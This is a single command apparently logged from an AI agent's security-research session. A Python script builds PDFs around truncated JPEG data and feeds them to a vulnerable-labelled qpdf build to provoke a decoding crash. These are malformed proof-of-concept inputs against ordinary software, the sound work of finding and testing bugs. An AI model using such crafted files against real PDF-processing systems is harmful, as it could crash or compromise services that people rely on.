Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
jpg=Path('/workspace/pocs/img_im.jpg').read_bytes()
def make(jpg,out):
    pdf=bytearray(b'%PDF-1.3\n%\xe2\xe3\xcf\xd3\n'); offs=[]
    def obj(n,s):
        offs.append(len(pdf)); pdf.extend(f'{n} 0 obj\n'.encode()+s+b'\nendobj\n')
    obj(1,b'<< /Type /Catalog /Pages 2 0 R >>')
    obj(2,b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
    obj(3,b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 8 24] /Resources << /XObject << /Im0 4 0 R >> >> /Contents 5 0 R >>')
    obj(4,f'<< /Type /XObject /Subtype /Image /Width 8 /Height 24 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length {len(jpg)} >>'.encode()+b'\nstream\n'+jpg+b'\nendstream')
    content=b'q 8 0 0 24 0 0 cm /Im0 Do Q\n'
    obj(5,f'<< /Length {len(content)} >>'.encode()+b'\nstream\n'+content+b'endstream')
    xref=len(pdf); pdf.extend(f'xref\n0 6\n0000000000 65535 f \n'.encode())
    for o in offs: pdf.extend(f'{o:010d} 00000 n \n'.encode())
    pdf.extend(f'trailer << /Root 1 0 R /Size 6 >>\nstartxref\n{xref}\n%%EOF\n'.encode())
    Path(out).write_bytes(pdf)
make(jpg,'/workspace/pocs/full.pdf')
# truncation at each SOS: include through n bytes after marker
positions=[]; data=jpg
for i in range(len(data)-1):
    if data[i]==0xff and data[i+1]==0xda: positions.append(i)
print('len',len(data),'SOS',positions)
for idx,pos in enumerate(positions[:10]):
    # SOS segment length at pos+2 big endian includes length bytes; entropy starts pos+2+seglen
    seglen=data[pos+2]*256+data[pos+3]
    start=pos+2+seglen
    for extra in [0,1,2,5,10,20,40]:
        cut=min(len(data),start+extra)
        make(data[:cut],f'/workspace/pocs/trunc_sos{idx}_e{extra}.pdf')
PY
for f in /workspace/pocs/full.pdf /workspace/pocs/trunc_sos0_e0.pdf /workspace/pocs/trunc_sos0_e20.pdf /workspace/pocs/trunc_sos1_e0.pdf; do echo RUN:$f; JSIMD_FORCENONE=1 /workspace/repo-vul/work-vul/bin/qpdf --decode-level=all --qdf "$f" /workspace/pocs/out.pdf >/tmp/qout 2>&1; echo exit:$?; head -20 /tmp/qout; done
